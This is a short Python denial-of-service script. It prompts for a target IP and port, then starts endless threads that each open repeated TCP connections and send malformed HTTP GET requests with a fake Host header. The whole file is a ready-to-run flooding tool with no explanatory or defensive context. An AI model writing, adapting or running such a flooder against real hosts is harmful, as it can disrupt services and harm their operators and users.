import threading
import socket

target = input("Enter a IP: ")
str_port = input("Enter port: ")
port = int(str_port)
fake_ip = '10.10.192.1'

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target,port))
		s.sendto(("GET /" + target + "HTTP/1.1.\r\n").encode('ascii'),(target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
		s.close()

while True:
	thread = threading.Thread(target=attack)
	thread.start()